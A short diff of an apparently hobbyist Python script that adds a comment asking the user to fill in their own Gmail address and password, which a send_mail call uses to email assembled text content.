@@ -41,5 +41,6 @@ for i in result:
         content += i + " "
     if "Key Content" in i:
         content += i + "\n\n"
-
+'''Enter your email and password in the function parameters'''
 send_mail("<Enter your gmail>", "<Enter your gmail password>", content)
+
